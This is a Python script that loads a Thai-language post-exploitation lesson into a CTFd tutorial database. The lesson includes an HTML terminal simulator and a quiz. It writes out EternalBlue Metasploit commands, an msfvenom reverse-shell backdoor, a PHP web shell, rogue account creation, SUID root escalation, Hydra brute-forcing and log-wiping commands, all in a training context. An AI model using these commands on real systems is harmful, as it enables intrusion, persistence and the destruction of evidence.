import json
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()
ctx = app.app_context()
ctx.push()
db = app.db

l176 = db.session.query(TutorialLesson).filter_by(id=176).first()

# ─── Block 0: Core Theoretical Contents (Metasploit run, Persistence, PrivEsc, Lateral, Covering Tracks) ───
val0 = """## 💀 Post-Exploitation & Privilege Escalation (การยึดสิทธิ์และการควบคุมระบบหลังเจาะ)
---

กระบวนการโจมตีเป้าหมายระยะสุดท้ายเพื่อสั่งยึดกุมควบคุมระบบถาวร เพิ่มระดับสิทธิ์ผู้ดูแลระบบ ลอบย้ายเครือข่าย ทำลายไฟล์ Log และส่งรายงานประเมินผลความปลอดภัย

### 🚀 1. Metasploit Console CLI Commands & SearchSploit
- 🛡️ **Metasploit console (msfconsole)**: ควบคุมและกำหนดค่า Payload เพื่อส่งถอดรหัส:
  - `search cve:2017-0144` (ค้นหาช่องโหว่ผ่านหมายเลข CVE)
  - `use exploit/windows/smb/ms17_010_eternalblue` (สั่งใช้โมดูลเจาะระบบ)
  - `show options` (เรียกดูพารามิเตอร์ที่ต้องการ)
  - `set RHOSTS <target_ip>` (กำหนดไอพีเซิร์ฟเวอร์ปลายทาง)
  - `set PAYLOAD windows/x64/meterpreter/reverse_tcp` (กำหนดเลือก Payload ขโมยสิทธิ์)
  - `run` หรือ `exploit` (ส่งเจาะระบบเป้าหมาย)
- 📂 **SearchSploit**: เครื่องมือประมวลสืบค้นช่องโหว่ความปลอดภัยจากฐานข้อมูล **Exploit-DB** แบบออฟไลน์ในเครื่อง Kali:
  - `searchsploit linux kernel 5.4` (ค้นหาช่องโหว่ของลินุกซ์เคอร์เนล)
  - `searchsploit -m 45010` (สั่งคัดลอกไฟล์ exploit หมายเลข 45010 มาแก้ไขใช้งาน)

---

### 🔑 2. Persistence: Creating Backdoors & Web Shells
เป้าหมายของการทำ **Persistence (การรักษาสิทธิ์รันถาวร)** เพื่อล็อกอินกลับคืนระบบได้ตลอดเวลา:
- 👥 **New accounts**: สั่งสร้าง User สวมรอย (Windows: `net user hacker 12345 /add` | Linux: `useradd hacker`)
- 🐚 **Reverse Shell Backdoors**: สั่งสร้างไฟล์ไบนารีส่งข้ามคืนสิทธิ์ด้วย **msfvenom**:
  `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf > backdoor`
- 🌐 **Web Shells**: การฝังไฟล์คำสั่งขนาดสั้นไว้ในหน้าเว็บเพื่อสั่งประมวลผลคำสั่ง OS ผ่าน URL:
  `<?php system($_GET['cmd']); ?>`
  เรียกใช้ผ่านบราวเซอร์: `http://<target>/shell.php?cmd=whoami`

---

### 📈 3. Privilege Escalation & Lateral Movement
- 📈 **Privilege Escalation**: การยกระดับสิทธิ์ตัวเอง:
  - **Vertical**: จากผู้ใช้ธรรมดา ขึ้นเป็นผู้ดูแลระบบสูงสุด (Root/Administrator) เช่น การหาช่องโหว่ไฟล์ SUID ด้วยคำสั่ง `find / -perm -4000 -type f 2>/dev/null`
  - **Horizontal**: การเจาะระบบข้ามไปสวมรอยใช้บัญชีผู้ใช้งานคนอื่นที่มีระดับสิทธิ์ความสำคัญใกล้เคียงกัน
- 🗺️ **Lateral Movement (การย้ายเครือข่ายภายใน)**: การเจาะข้อมูลขยับขยายขอบเขตจากเครื่องที่เจาะได้ ไปยังเครื่องอื่นๆ ในวงแลนเดียวกัน:
  - **Pass-the-Hash (PtH)**: การใช้ NTLM hash ที่สกัดมาได้ล็อกอินตรงโดยไม่ต้องแกะถอดรหัสผ่าน (Mimikatz)
  - **Pass-the-Ticket (PtT)**: การขโมยตั๋ว Kerberos (TGT) เพื่อสั่งเชื่อมต่อระบบ Active Directory

---

### 🧹 4. Covering Tracks & Reporting
- 🧹 **Covering Tracks**: การทำลายล้างหลักฐานการบุกรุกเพื่อไม่ให้ผู้ดูแลระบบสังเกตเห็น:
  - สั่งลบชื่อ User สวมรอย ล้างประวัติคำสั่งบนเทอร์มินัล (Linux: `history -c && history -w`)
  - ล้างไฟล์ Event logs ของเซิร์ฟเวอร์ (Windows: `wevtutil cl` | Linux: `echo "" > /var/log/syslog`)
  - ใช้โปรแกรมกวาดล้างร่องรอย เช่น **BleachBit** (รองรับการ shred ล้างข้อมูลถาวรเลี่ยงการกู้คืนไฟล์)
- 📝 **Reporting**: เขียนเอกสารสรุปช่องโหว่ PoC ขั้นตอนจำลอง และคำสั่งแนะนำแก้ไข (Mitigation) ให้องค์กร"""

# ─── Block 1: Post-Exploitation Sandbox (Live Terminal Simulator) ───
val1 = """### 💻 Post-Exploitation Coding Sandbox (จำลองคำสั่งยึดสิทธิ์และล้างล็อกระบบ)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาตัวอย่างเครื่องมือวิเคราะห์ระบบ และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลลัพธ์ผ่านเทอร์มินัลระบบ:

<style>
.w-sandbox-main{display:flex;gap:20px;margin:2rem auto;max-width:1050px;}
@media(max-width:820px){.w-sandbox-main{flex-direction:column;}}

.w-sandbox-nav{width:220px;display:flex;flex-direction:column;gap:6px;flex-shrink:0;}
@media(max-width:820px){.w-sandbox-nav{width:100%;flex-direction:row;flex-wrap:wrap;}}
.w-nav-item{padding:8px 12px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.04);border-radius:6px;font-size:0.75rem;color:#cbd5e1;cursor:pointer;text-align:left;transition:all 0.15s ease;}
.w-nav-item:hover, .w-nav-item.active{border-color:#00f0ff;color:#ffffff;background:rgba(0,240,255,0.04);}
.w-nav-item.active{font-weight:bold;box-shadow:0 0 8px rgba(0,240,255,0.1);}

.w-sandbox-panels{flex:1;display:flex;flex-direction:column;gap:14px;}
.w-sand-panel{display:none;background:#05070f;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.45);box-sizing:border-box;}
.w-sand-panel.active{display:block !important;}

.w-sand-hdr{font-size:0.95rem;font-weight:800;color:#ffffff;border-bottom:1px solid rgba(255,255,255,0.06);padding-bottom:10px;margin-bottom:14px;display:flex;justify-content:between;align-items:center;}
.w-sand-hdr span.tag{font-size:0.65rem;padding:2px 8px;border-radius:4px;background:rgba(0,240,255,0.08);border:1px solid rgba(0,240,255,0.2);color:#00f0ff;font-family:'JetBrains Mono',monospace;}
.w-sand-code{font-family:'JetBrains Mono',monospace;font-size:0.8rem;color:#00f0ff;white-space:pre-wrap;margin:0 0 12px;background:rgba(0,0,0,0.2);padding:14px;border-radius:8px;border:1px solid rgba(255,255,255,0.02);}

/* Terminal box */
.w-sand-term-container{position:relative;background:#02040a;border:1px solid rgba(255,255,255,0.06);border-radius:8px;margin-bottom:16px;box-shadow:inset 0 2px 8px rgba(0,0,0,0.9);overflow:hidden;}
.w-sand-term-bar{background:rgba(255,255,255,0.03);padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:center;}
.w-sand-term-title{font-size:0.65rem;color:#64748b;font-weight:800;letter-spacing:0.06em;font-family:'JetBrains Mono',monospace;}
.w-sand-term-btn{background:rgba(0,240,255,0.1);border:1px solid rgba(0,240,255,0.3);border-radius:4px;color:#00f0ff;font-size:0.68rem;padding:3px 8px;cursor:pointer;font-family:'JetBrains Mono',monospace;font-weight:700;transition:all 0.15s ease;display:flex;align-items:center;gap:4px;}
.w-sand-term-btn:hover{background:#00f0ff;color:#02040a;box-shadow:0 0 8px rgba(0,240,255,0.4);}
.w-sand-term{font-family:'JetBrains Mono',monospace;font-size:0.76rem;color:#a7f3d0;padding:12px 16px;white-space:pre-wrap;min-height:90px;}
.w-sand-term span.prompt{color:#3ddc84;}
.w-sand-term span.cmd{color:#ffffff;font-weight:bold;}

.w-sand-expl{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:16px;font-size:0.83rem;color:#cbd5e1;line-height:1.65;}
.w-sand-expl h5{margin:0 0 8px;font-size:0.85rem;color:#fbbf24;font-weight:bold;}
.w-sand-expl p{margin:0 0 10px;}
.w-sand-expl p:last-child{margin-bottom:0;}
.w-sand-expl ul{margin:0;padding-left:20px;}
.w-sand-expl li{margin-bottom:6px;}
.w-sand-expl strong{color:#ffffff;}
</style>

<div class="w-sandbox-main">
<!-- Navigation Left Side -->
<div class="w-sandbox-nav">
<button id="nav-item-msfconsole" class="w-nav-item active" onclick="showSandboxItem('msfconsole', this)">1. Metasploit Attack Handler</button>
<button id="nav-item-searchsploit" class="w-nav-item" onclick="showSandboxItem('searchsploit', this)">2. SearchSploit offline lookup</button>
<button id="nav-item-hydra" class="w-nav-item" onclick="showSandboxItem('hydra', this)">3. Hydra SSH brute-force</button>
<button id="nav-item-suid" class="w-nav-item" onclick="showSandboxItem('suid', this)">4. Linux SUID Privilege Esc.</button>
<button id="nav-item-bleachbit" class="w-nav-item" onclick="showSandboxItem('bleachbit', this)">5. BleachBit log cleanup</button>
</div>

<!-- Panel details right side -->
<div class="w-sandbox-panels">

<!-- 1. msfconsole -->
<div id="panel-msfconsole" class="w-sand-panel">
<div class="w-sand-hdr"><span>1. Metasploit console execution</span> <span class="tag">Metasploit</span></div>
<pre class="w-sand-code"># สั่งรันโมดูลโจมตีและกำหนดเป้าหมายเพื่อรับสิทธิ์ควบคุม
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.19.19.129
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.19.19.200
exploit</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startPostSim('msfconsole')">▶ Run Simulation</button>
</div>
<div id="term-msfconsole" class="w-sand-term"><span class="prompt">msf6 &gt;</span> [กดปุ่ม Run Simulation เพื่อจำลองคอมมานด์]</</div>
</div>
<div class="w-sand-expl">
<h5>⚙️ Command Description</h5>
<p>การโจมตีเป้าหมายเพื่อฝัง Meterpreter payload หากเจาะสำเร็จจะได้รับสิทธิ์ควบคุมเครื่องเป้าหมายในโหมดแอนตี้ฟอเรนสิกส์</p>
</div>
</div>

<!-- 2. SearchSploit -->
<div id="panel-searchsploit" class="w-sand-panel">
<div class="w-sand-hdr"><span>2. SearchSploit Offline Query</span> <span class="tag">Linux CLI</span></div>
<pre class="w-sand-code"># ค้นหาโค้ดโจมตีช่องโหว่ CVE-2021-44228 (Log4Shell)
searchsploit CVE-2021-44228</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startPostSim('searchsploit')">▶ Run Simulation</button>
</div>
<div id="term-searchsploit" class="w-sand-term"><span class="prompt">root@kali:~#</span> [กดปุ่ม Run Simulation เพื่อจำลองคำสั่ง]</div>
</div>
<div class="w-sand-expl">
<h5>⚙️ Command Description</h5>
<p><strong>SearchSploit</strong> สแกนค้นหาซอร์สโค้ดไฟล์ PoC ของช่องโหว่ความปลอดภัยที่จัดเก็บไว้ในฐานข้อมูลออฟไลน์โดยไม่ต้องเปิดต่อเน็ต</p>
</div>
</div>

<!-- 3. Hydra -->
<div id="panel-hydra" class="w-sand-panel">
<div class="w-sand-hdr"><span>3. Hydra SSH Credentials Guessing</span> <span class="tag">Linux CLI</span></div>
<pre class="w-sand-code"># สแกนยิงรหัสผ่านล็อกอิน SSH ของเป้าหมายด้วย Wordlist
hydra -l root -P rockyou.txt 172.19.19.129 ssh</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startPostSim('hydra')">▶ Run Simulation</button>
</div>
<div id="term-hydra" class="w-sand-term"><span class="prompt">root@kali:~#</span> [กดปุ่ม Run Simulation เพื่อจำลองการยิงรหัส]</div>
</div>
<div class="w-sand-expl">
<h5>⚙️ Command Description</h5>
<p><strong>Hydra</strong> ดำเนินการล็อกอินยิงรหัสผ่านสุ่มแบบคู่ขนานประสิทธิผลสูง กวาดหาคีย์ผ่าน Wordlist rockyou</p>
</div>
</div>

<!-- 4. SUID -->
<div id="panel-suid" class="w-sand-panel">
<div class="w-sand-hdr"><span>4. Linux SUID Privilege Escalation</span> <span class="tag">Linux CLI</span></div>
<pre class="w-sand-code"># สั่งหาช่องโหว่รันไทม์ของไฟล์ไบนารีระบบที่สวมรหัสเจ้าของเป็น root
find / -perm -4000 -type f 2>/dev/null</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startPostSim('suid')">▶ Run Simulation</button>
</div>
<div id="term-suid" class="w-sand-term"><span class="prompt">victim@ubuntu:~$</span> [กดปุ่ม Run Simulation เพื่อจำลองตรรกะเจาะสิทธิ์]</div>
</div>
<div class="w-sand-expl">
<h5>⚙️ Command Description</h5>
<p>หากพบไฟล์ระบบที่เปิดสิทธิ์ SUID ไว้เกินจำเป็น (เช่น `find`) จะสามารถสั่งเปิดสิทธิ์ shell ในระดับ root ได้ทันที</p>
</div>
</div>

<!-- 5. BleachBit -->
<div id="panel-bleachbit" class="w-sand-panel">
<div class="w-sand-hdr"><span>5. BleachBit log cleanup</span> <span class="tag">Linux CLI</span></div>
<pre class="w-sand-code"># สั่งกวาดล้างร่องรอยและลบล็อกไฟล์เพื่อปกปิดร่องรอยการยึดเครื่อง
bleachbit --clean system.logs system.tmp</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startPostSim('bleachbit')">▶ Run Simulation</button>
</div>
<div id="term-bleachbit" class="w-sand-term"><span class="prompt">root@kali:~#</span> [กดปุ่ม Run Simulation เพื่อจำลองคำสั่ง]</div>
</div>
<div class="w-sand-expl">
<h5>⚙️ Command Description</h5>
<p><strong>BleachBit</strong> สั่งลบไฟล์ขยะและระบบ Log ในสิทธิแอนตี้ฟอเรนสิกส์ ป้องกันผู้ดูแลเครื่องสืบพิกัดกลับ</p>
</div>
</div>

</div>
</div>

<script>
window.showSandboxItem = function(itemKey, element) {
  const items = document.querySelectorAll('.w-sandbox-nav .w-nav-item');
  items.forEach(i => i.classList.remove('active'));
  element.classList.add('active');

  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => {
    p.style.setProperty('display', 'none', 'important');
  });

  const targetPanel = document.getElementById('panel-' + itemKey);
  if (targetPanel) {
    targetPanel.style.setProperty('display', 'block', 'important');
  }
}

// Auto render
setTimeout(() => {
  const activeBtn = document.querySelector('.w-sandbox-nav .w-nav-item.active');
  if (activeBtn) { activeBtn.click(); }
}, 100);

// Simulator logic
window.startPostSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;

  term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">Processing exploit/persistence vector...</span>\\n[.] Packaging shellcode\\n[.] Executing exploit...';

  setTimeout(() => {
    if (itemKey === 'msfconsole') {
      term.innerHTML = '<span class="prompt">msf6 &gt;</span> <span class="cmd">exploit</span>\\n[*] Started reverse TCP handler on 172.19.19.200:4444\\n[*] Sending Stage (200262 bytes) to 172.19.19.129\\n[*] <span style="color:#3ddc84; font-weight:bold;">Meterpreter session 1 opened (172.19.19.200:4444 -&gt; 172.19.19.129:49156)</span>\\n\\nmeterpreter &gt; <span style="color:#00f0ff;">getuid</span>\\nServer username: <span style="color:#3ddc84; font-weight:bold;">NT AUTHORITY\\\\SYSTEM</span>';
    } else if (itemKey === 'searchsploit') {
      term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">searchsploit CVE-2021-44228</span>\\n------------------------------------------------------------------------\\n Exploit Title                                           |  Path\\n------------------------------------------------------------------------\\n Apache Log4j2 2.14.1 - Remote Code Execution (RCE) PoC  | java/webapps/50592.txt\\n------------------------------------------------------------------------\\nShellcodes: No Results';
    } else if (itemKey === 'hydra') {
      term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">hydra -l root -P rockyou.txt 172.19.19.129 ssh</span>\\nHydra v9.2 (c) 2021 by van Hauser/THC - Playlist activated\\n[DATA] attacking ssh://172.19.19.129:22/\\n[22][ssh] host: 172.19.19.129 login: <span style="color:#3ddc84; font-weight:bold;">root</span> password: <span style="color:#3ddc84; font-weight:bold;">password123</span>\\n1 of 1 target successfully completed, 1 valid password found';
    } else if (itemKey === 'suid') {
      term.innerHTML = '<span class="prompt">victim@ubuntu:~$</span> <span class="cmd">find . -exec /bin/sh -p \\;</span>\\n# <span style="color:#3ddc84; font-weight:bold;">whoami</span>\\n<span style="color:#3ddc84; font-weight:bold;">root</span>\\n# [+] SUID Privilege Escalation succeeded!';
    } else if (itemKey === 'bleachbit') {
      term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">bleachbit --clean system.logs</span>\\nDelete 42.1kB /var/log/syslog\\nDelete 12.5kB /var/log/auth.log\\nDisk space recovered: 54.6kB';
    }
  }, 1000);
}
</script>"""

# ─── Block 2: Quick Quiz and Progress Gauge ───
val2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;">
<div class="col-md-8">

<!-- Question 1 -->
<div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;">
<p class="text-white mb-2" style="font-size:0.88rem; font-weight:600;">1. การเปลี่ยนสิทธิ์จากผู้ใช้งานทั่วไป (Normal user) ขึ้นเป็นสิทธิ์ผู้ดูแลระบบสูงสุด (Root/Admin) เรียกว่าอะไร? (ระบุคีย์เวิร์ดภาษาอังกฤษ 3 คำ เช่น Horizontal Privilege Escalation)</p>
<div class="input-group">
<input type="text" class="form-control question-input" placeholder="คำตอบของคุณ..." data-hash="d3cbf07c6f0927dfa60ea57790b4d4814d4bc10b27b9c9f6d4d123e7f0b503db" style="background:rgba(15,17,26,0.8) !important; border:1px solid rgba(255,255,255,0.12) !important; color:#ffffff !important; font-family:\'JetBrains Mono\',monospace; font-size:0.9rem; border-radius:6px 0 0 6px !important;">
<div class="input-group-append">
<button class="btn btn-warning px-4 text-dark font-weight-bold" type="button" onclick="verifyLessonQuiz(this)">
<i class="fas fa-paper-plane mr-1"></i> Submit
</button>
</div>
</div>
<div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div>
</div>

<!-- Question 2 -->
<div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;">
<p class="text-white mb-2" style="font-size:0.88rem; font-weight:600;">2. คำสั่งมาตรฐานใดใน Linux ที่สามารถสวมรอยใช้หาไฟล์ระบบที่ตั้งค่าสิทธิ์ SUID บกพร่อง เพื่อใช้ทำ Privilege Escalation? (ระบุเป็นชื่อคำสั่งภาษาอังกฤษตัวพิมพ์เล็กทั้งหมด)</p>
<div class="input-group">
<input type="text" class="form-control question-input" placeholder="คำตอบของคุณ..." data-hash="f8812c75a4da4d53860bb402131ab1053be4162464eb789c674251147a4eb31d" style="background:rgba(15,17,26,0.8) !important; border:1px solid rgba(255,255,255,0.12) !important; color:#ffffff !important; font-family:\'JetBrains Mono\',monospace; font-size:0.9rem; border-radius:6px 0 0 6px !important;">
<div class="input-group-append">
<button class="btn btn-warning px-4 text-dark font-weight-bold" type="button" onclick="verifyLessonQuiz(this)">
<i class="fas fa-paper-plane mr-1"></i> Submit
</button>
</div>
</div>
<div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div>
</div>

</div>

<!-- Gauge Column -->
<div class="col-md-4 text-center">
<div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;">
<span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span>
<div class="neon-gauge-container">
<svg class="neon-gauge" viewBox="0 0 36 36">
<path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
<path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
<text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text>
</svg>
</div>
<span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดส่งคำตอบให้ครบ 2 ข้อ</span>
</div>
</div>

</div>

<style>
/* CSS gauge animations and styles */
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:#00f0ff; stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease, stroke 0.5s ease; filter:drop-shadow(0 0 5px rgba(0,240,255,0.5));}
.neon-gauge-text {fill:#ffffff; font-family:\'JetBrains Mono\',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}
</style>

<script>
// SHA-256 calculator function
async function sha256hex(str) {
  const buf = new TextEncoder().encode(str.trim().toLowerCase());
  const hashBuf = await crypto.subtle.digest(\'SHA-256\', buf);
  const arr = Array.from(new Uint8Array(hashBuf));
  return arr.map(b => b.toString(16).padStart(2, \'0\').trim()).join(\'\');
}

// Local storage progress tracking
const lessonKey = 'solved_lesson_176';

function getSavedSolves() {
  try {
    return JSON.parse(localStorage.getItem(lessonKey) || '[]');
  } catch(e) {
    return [];
  }
}

function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);

  const fill = document.getElementById(\'lesson-gauge-fill\');
  const text = document.getElementById(\'lesson-gauge-text\');
  const status = document.getElementById(\'lesson-status-txt\');

  if (fill) fill.setAttribute(\'stroke-dasharray\', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;

  if (solved.length === total) {
    if (fill) fill.style.stroke = \'#3ddc84\';
    if (status) {
      status.innerHTML = \'<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>\';
    }
  } else {
    if (fill) fill.style.stroke = \'#00f0ff\';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}

window.verifyLessonQuiz = async function(button) {
  const cell = button.closest(\'.question-cell\');
  const input = cell.querySelector(\'.question-input\');
  const feedback = cell.querySelector(\'.feedback-msg\');
  const targetHash = input.getAttribute(\'data-hash\');
  const val = input.value.trim();

  if (!val) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = \'<i class="fas fa-exclamation-triangle mr-1"></i> กรุณากรอกคำตอบ\';
    feedback.style.setProperty(\'display\', \'block\', \'important\');
    return;
  }

  const userHash = await sha256hex(val);
  if (userHash === targetHash) {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = \'<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!\';
    feedback.style.setProperty(\'display\', \'block\', \'important\');
    input.classList.remove(\'is-invalid\');
    input.classList.add(\'is-valid\');
    input.disabled = true;
    button.disabled = true;

    // Save solve status
    const solved = getSavedSolves();
    if (!solved.includes(targetHash)) {
      solved.push(targetHash);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = \'<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองอีกครั้ง!\';
    feedback.style.setProperty(\'display\', \'block\', \'important\');
    input.classList.remove(\'is-valid\');
    input.classList.add(\'is-invalid\');
  }
}

// Auto init state on load
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll(\'.question-input\').forEach(input => {
    const hash = input.getAttribute(\'data-hash\');
    if (solved.includes(hash)) {
      input.value = "COMPLETED";
      input.disabled = true;
      input.classList.add(\'is-valid\');
      const cell = input.closest(\'.question-cell\');
      if (cell) {
        const btn = cell.querySelector(\'button\');
        if (btn) btn.disabled = true;
        const fb = cell.querySelector(\'.feedback-msg\');
        if (fb) {
          fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
          fb.innerHTML = \'<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว\';
          fb.style.setProperty(\'display\', \'block\', \'important\');
        }
      }
    }
  });
  updateLocalProgress();
}, 200);
</script>"""

# Make structure list of content
content_json = [
    {"type": "markdown", "value": val0},
    {"type": "markdown", "value": val1},
    {"type": "markdown", "value": val2}
]

l176.content = json.dumps(content_json, ensure_ascii=False)
db.session.query(TutorialLesson).filter_by(id=176).update({"content": l176.content})
db.session.commit()
print("Lesson 176 successfully updated and structured!")
ctx.pop()
